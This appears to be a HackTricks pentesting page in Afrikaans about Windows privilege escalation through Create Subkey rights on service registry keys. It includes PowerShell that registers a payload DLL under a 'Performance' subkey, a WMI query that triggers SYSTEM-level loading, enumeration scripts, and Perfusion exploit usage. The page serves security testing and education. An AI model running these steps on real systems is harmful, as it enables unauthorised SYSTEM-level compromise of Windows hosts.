# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**Die oorspronklike plasing is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Opsomming

As jy slegs **`Create Subkey`** / **`AppendData/AddSubdirectory`** op 'n service registry key het, is dit steeds 'n goeie privesc-leidraad. Jy kan gewoonlik nie **`ImagePath`**, **`ServiceDll`** of ander bestaande waardes direk oorskryf nie, maar jy kan moontlik steeds 'n **`Performance`** child key skep onder:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Enige ander **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**-key waar jou token **`KEY_CREATE_SUB_KEY`** het

Die truuk is dat Windows steeds die legacy **PerfLib V1**-registrasiemodel ondersteun. As 'n service 'n **`Performance`**-subkey het, kan Windows 'n DLL daarvandaan laai wanneer 'n performance counter consumer data versoek.

Volgens Microsoft-dokumentasie is die minimum registrasie:<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Die offensiewe gevolgtrekking is: **moenie 'n service registry finding weggooi net omdat jy slegs `CreateSubKey` in plaas van `SetValue` gekry het nie**.<sup>[[3]](#references)</sup>

## Waarom dit genoeg is vir code execution

Die `Performance`-subkey bestaan **gewoonlik nie by verstek op hierdie services nie**, dus is **`KEY_CREATE_SUB_KEY`** die primitive wat jy nodig het. Sodra die key bestaan en `Library`/`Open`/`Collect`/`Close` bevat, kan enige **performance counter consumer** die DLL load trigger.<sup>[[3]](#references)</sup>

'n Paar belangrike besonderhede:

- Die **`Library`**-value kan na 'n **volledige DLL path** verwys.
- Die DLL moet **`OpenPerfData`**, **`CollectPerfData`** en **`ClosePerfData`** export en `ERROR_SUCCESS` return.
- Die code loop in die **consumer se context**, **nie noodwendig in die kwesbare service process self nie**.
- In die klassieke `RpcEptMapper` / `Dnscache`-geval kan 'n **WMI performance query** veroorsaak dat **`wmiprvse.exe`** die DLL as **`NT AUTHORITY\SYSTEM`** load.

Dit is waarom die primitive maklik tydens triage misgekyk word: die parent service key is nie "fully writable" nie, maar dit kan steeds weaponized word.

## Quick enumeration

Manual spot-check met **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
PowerShell-voorbeeld om na lae-bevoorregte principals met **`CreateSubKey`** op dienssleutels te soek:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Nuttige tools:

- **PrivescCheck**: `Get-ModifiableRegistryPath` is spesifiek geskep om hierdie klas probleem op te spoor.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: outomatiseer DLL drop, `Performance`-registrasie, WMI-trigger, token duplication en cleanup op legacy kwesbare teikens (byvoorbeeld: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## Misbruikvloei

Skep die `Performance`-subsleutel en vul die vereiste waardes in:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Loods dan ’n **bevoorregte** performance consumer. ’n Klassieke voorbeeld is ’n WMI-query oor `Win32_Perf*`-klasse:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Operasionele notas:

- Die launching van **`perfmon.exe`** is nuttig om te verifieer dat die counter registration korrek is, maar dit laai gewoonlik net die DLL in **jou eie user context**.
- Vir 'n werklike LPE, trigger 'n **privileged** consumer soos **WMI**.
- As jy jou eie exploit skryf, laat die spawning van `cmd.exe` direk vanuit die DLL jou gewoonlik met 'n shell in **session 0**. `Perfusion` los dit op deur die privileged token te duplicate na 'n process wat suspended in die aanvaller se session geskep is.<sup>[[4]](#references)</sup>
- Pas die DLL architecture by die target consumer (**x64 on x64 systems**).

## Weergawe-notas / onlangse ontwikkelings

Histories was die ingeboude weak keys:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` en `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` merk op dat die **April 2021** updates die maklike exploitation path op opgedateerde **Windows 8 / Windows Server 2012** verwyder het, terwyl **Windows 7 / Windows Server 2008 R2** exploitable gebly het deur **`Dnscache`**.<sup>[[4]](#references)</sup>

Hierdie primitive is **nie slegs histories nie**. In **Januarie 2025** het Microsoft 'n verwante AD DS-kwessie gepatch waar lede van **`Network Configuration Operators`** subkeys onder **`Dnscache`** en **`NetBT`** kon skep, en dieselfde **Performance-counter DLL registration**-idee kon hergebruik word om **SYSTEM** op supported systems te bereik.<sup>[[2]](#references)</sup>

Die moderne les is dus generies: wanneer 'n low-privileged principal **`CreateSubKey`** op **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** het, kyk of 'n **`Performance`** child key voldoende is voordat jy die finding van die hand wys.

## Verwysings

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
